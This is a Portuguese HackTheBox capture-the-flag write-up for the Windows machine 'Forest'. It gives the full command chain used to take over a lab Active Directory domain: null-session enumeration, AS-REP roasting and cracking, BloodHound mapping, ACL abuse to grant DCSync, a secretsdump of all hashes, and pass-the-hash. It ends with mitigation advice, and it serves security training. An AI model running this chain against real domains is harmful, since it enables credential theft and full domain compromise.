# Forest — HackTheBox Write-up

**Active Directory | Windows Server 2016 | Dificuldade: Easy**

🇬🇧 [English version](README.en.md)

---

## Sumário Executivo

Forest é uma máquina Windows do HackTheBox construída em torno de um ambiente de Active Directory com Exchange Server instalado — um cenário extremamente comum em redes corporativas reais. O comprometimento total do domínio foi alcançado através de uma cadeia de quatro fases: enumeração não autenticada via SMB/RPC, obtenção de credencial inicial por AS-REP Roasting, mapeamento de relações de privilégio com BloodHound e abuso de uma cadeia de grupos aninhados que termina em **WriteDACL** sobre o objeto do domínio — permissão suficiente para se autoconceder direitos de replicação (**DCSync**) e extrair todos os hashes do banco NTDS.DIT, incluindo o do Administrator.

Esse tipo de cadeia — `GenericAll` sobre um grupo aninhado até um grupo com `WriteDACL` sobre o domínio — é uma classe de vulnerabilidade real e recorrente em ambientes que instalam Exchange sem revisar as permissões herdadas que o instalador concede automaticamente.

## Informações da Máquina

| Atributo | Valor |
|---|---|
| Nome | Forest |
| Plataforma | HackTheBox |
| Sistema Operacional | Windows Server 2016 Standard (build 14393) |
| Domínio | `htb.local` |
| Dificuldade | Easy |
| Categoria | Active Directory |
| Técnicas principais | RPC/LDAP null session, AS-REP Roasting, ACL Abuse, DCSync, Pass-the-Hash |

---

## 1. Reconhecimento

Scan de portas com detecção de serviços e scripts padrão do Nmap (`-sC`), que já traz informação valiosa sobre hosts Windows via `smb2-time` e `smb-os-discovery`:

```bash
nmap -sC 10.129.36.8
```

![Varredura Nmap revelando um Domain Controller completo](images/01_nmap.png)

O resultado já identifica a máquina como Domain Controller sem necessidade de enumeração adicional: as portas 88 (Kerberos), 389/636/3268/3269 (LDAP/LDAPS/Global Catalog) e 445 (SMB) formam a assinatura clássica de um DC. O `smb-os-discovery` confirmou o SO (Windows Server 2016 Standard 14393), o domínio (`htb.local`) e o hostname (`FOREST`) sem qualquer autenticação.

## 2. Enumeração

Teste de sessão não autenticada (null session) para consultar o RPC endpoint do Domain Controller sem credenciais:

```bash
rpcclient -U "" -N 10.129.36.8 -c "enumdomusers"
```

![Enumeração completa de usuários via sessão nula RPC](images/02_enum_users.png)

O bind anônimo funcionou e devolveu os 32 usuários do domínio, incluindo contas humanas (`sebastien`, `lucinda`, `andy`, `mark`, `santi`), contas de serviço do Exchange (`SM_*`) e contas de Health Mailbox — geradas automaticamente pela instalação do Microsoft Exchange. Esse ruído de contas de sistema é uma pista de que grupos de permissão do Exchange provavelmente existem com privilégios amplos sobre o domínio.

## 3. Acesso Inicial — AS-REP Roasting

Teste de quais contas têm pré-autenticação Kerberos desabilitada (`UF_DONT_REQUIRE_PREAUTH`):

```bash
impacket-GetNPUsers htb.local/ -no-pass -usersfile users.txt -dc-ip 10.129.36.8
```

![Hash AS-REP obtido para svc-alfresco](images/03_asrep_roast.png)

`svc-alfresco` — uma conta de serviço que nem constava na enumeração original — retornou um hash `$krb5asrep$23$`. Contas de serviço são o alvo clássico dessa técnica: raramente aparecem em revisões de segurança e costumam manter configurações padrão desde a criação.

Quebra offline com John the Ripper:

```bash
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt alfrescohash.txt
```

![Senha de svc-alfresco quebrada em menos de um segundo](images/04_john_crack.png)

Senha recuperada: **`s3rvice`**.

## 4. Validação de Acesso e Flag de Usuário

```bash
nxc winrm 10.129.36.8 -u 'svc-alfresco' -p 's3rvice'
```

![NetExec confirma acesso via WinRM](images/05_winrm_check.png)

```bash
evil-winrm -i 10.129.36.8 -u svc-alfresco -p s3rvice
```

![Shell interativa e flag de usuário](images/06_user_flag.png)

## 5. Escalação de Privilégio — Mapeamento com BloodHound

A partir daqui, enumerar manualmente grupos e ACLs deixa de ser viável — hora de trocar enumeração linear por análise de grafo:

```bash
bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local -ns 10.129.36.8 -c All
```

![Coleta completa de dados do domínio](images/07_bloodhound_collect.png)

A análise do nó `htb.local` revelou que o grupo **Exchange Windows Permissions** tem `WriteDacl` diretamente sobre o objeto do domínio:

![BloodHound expõe WriteDacl sobre HTB.LOCAL](images/08_bloodhound_writedacl.png)

Misconfiguração real e bem documentada: a instalação do Microsoft Exchange concede automaticamente permissões elevadas a grupos de gerenciamento — nesse caso, controle total sobre a DACL do próprio domínio.

Pathfinding para verificar se `svc-alfresco` tinha caminho até esse grupo:

![Caminho de privilégio até Exchange Windows Permissions](images/09_pathfinding.png)

Cadeia: `svc-alfresco` → `Service Accounts` → `Privileged IT Accounts` → `Account Operators` **(GenericAll)** → `Exchange Windows Permissions`.

## 6. Exploração da Cadeia — de GenericAll a DCSync

1. Adicionar `svc-alfresco` ao grupo `Exchange Windows Permissions`, usando o `GenericAll` herdado de `Account Operators`.
2. Usar o `WriteDacl` herdado sobre o domínio para conceder `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`.
3. Executar o DCSync.

```bash
net rpc group addmem "Exchange Windows Permissions" svc-alfresco \
    -U htb.local/svc-alfresco%s3rvice -S 10.129.36.8

bloodyAD -H 10.129.36.8 -d htb.local -u svc-alfresco -p s3rvice add dcsync svc-alfresco
```

![Inclusão no grupo e concessão de DCSync](images/10_exploit_dcsync.png)

> **Nota prática:** a primeira tentativa de conceder DCSync falhou com `insufficientAccessRights` porque o `addmem` nunca foi verificado. Só depois de confirmar a membership com `net rpc group members` ficou claro que o passo 1 não tinha sido concluído — lição: confirmar cada elo antes de avançar.

## 7. DCSync e Comprometimento Total do Domínio

```bash
impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.129.36.8
```

![Dump completo do NTDS.DIT](images/11_secretsdump.png)

Resultado: hash NTLM do Administrator (`32693b11e6aa90eb43d32c72a07ceea6`), do `krbtgt` e de todas as demais contas.

## 8. Root Flag — Pass-the-Hash

```bash
evil-winrm -i 10.129.36.8 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

![Acesso como Administrator e flag final](images/12_root_flag.png)

---

## 9. Cadeia de Ataque — Resumo

1. Nmap identifica um Domain Controller (`htb.local`).
2. Sessão RPC nula enumera os 32 usuários do domínio sem credenciais.
3. AS-REP Roasting revela `svc-alfresco` com pré-autenticação desabilitada.
4. Hash quebrado offline com John the Ripper (senha: `s3rvice`).
5. Acesso via WinRM confirmado — primeira flag capturada.
6. BloodHound mapeia o domínio e revela `WriteDacl` de `Exchange Windows Permissions` sobre `htb.local`.
7. Pathfinding mostra o caminho via `Account Operators` (`GenericAll`).
8. `svc-alfresco` se adiciona ao grupo, herda `WriteDacl` e concede a si mesmo DCSync.
9. `secretsdump` extrai o NTDS.DIT completo, incluindo o hash do Administrator.
10. Pass-the-Hash finaliza o comprometimento total do domínio.

## 10. Lições Técnicas

- Sessões nulas em SMB/RPC ainda existem em ambientes legados e permitem reconhecimento completo sem credenciais.
- Contas de serviço são o alvo mais produtivo para AS-REP Roasting e Kerberoasting.
- Cadeias de grupos aninhados escondem privilégio real: `GenericAll` sobre um grupo aparentemente inofensivo pode equivaler a controle total sobre o domínio.
- A instalação do Microsoft Exchange é uma fonte recorrente de escalação de privilégio em AD.
- Ferramentas de análise de grafo (BloodHound) são indispensáveis a partir do momento em que o domínio tem mais que um punhado de objetos.
- DCSync é o objetivo final de qualquer cadeia de ACL abuse que chegue a direitos de replicação sobre o domínio.

## 11. Recomendações de Mitigação

- Desabilitar sessões nulas de SMB e binds anônimos de LDAP/RPC.
- Impor pré-autenticação Kerberos obrigatória em todas as contas, com atenção especial a contas de serviço.
- Aplicar senhas fortes e rotação periódica em contas de serviço.
- Auditar regularmente a associação de grupos privilegiados e revisar permissões concedidas por instaladores como o do Exchange.
- Monitorar e alertar sobre alterações de DACL em objetos Tier Zero.
- Detectar chamadas DRSUAPI de origem que não seja um Domain Controller legítimo.

## Ferramentas Utilizadas

| Ferramenta | Finalidade |
|---|---|
| Nmap | Varredura de portas e detecção de serviços |
| rpcclient | Enumeração de usuários via sessão nula RPC |
| Impacket (GetNPUsers, secretsdump) | AS-REP Roasting e extração de credenciais via DCSync |
| John the Ripper | Quebra de hash offline (AS-REP) |
| NetExec (nxc) | Validação de credenciais em serviços remotos |
| Evil-WinRM | Shell interativa via WinRM, incluindo Pass-the-Hash |
| BloodHound / bloodhound-python | Mapeamento de relações de privilégio no AD |
| net rpc (Samba) | Manipulação de membros de grupo via RPC |
| bloodyAD | Manipulação de ACL/DACL via LDAP |
